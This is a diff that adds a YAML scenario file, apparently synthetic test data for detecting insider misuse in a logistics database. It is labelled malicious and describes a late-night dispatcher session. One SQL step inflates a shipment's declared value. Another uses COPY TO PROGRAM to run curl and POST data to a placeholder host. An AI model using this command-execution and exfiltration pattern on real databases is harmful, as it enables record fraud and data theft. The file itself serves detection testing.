@@ -1,0 +1,23 @@
+scenario_id: gen_logistics_58_data_tamper_mal_1547
+family_id: gen_logistics_58_data_tamper_mal_fam1547
+domain: logistics
+time_of_day: '22:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: dispatcher
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: UPDATE manifests SET declared_value = 366932 WHERE shipment_id = 64713
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.74.27.184
+      port: 3389
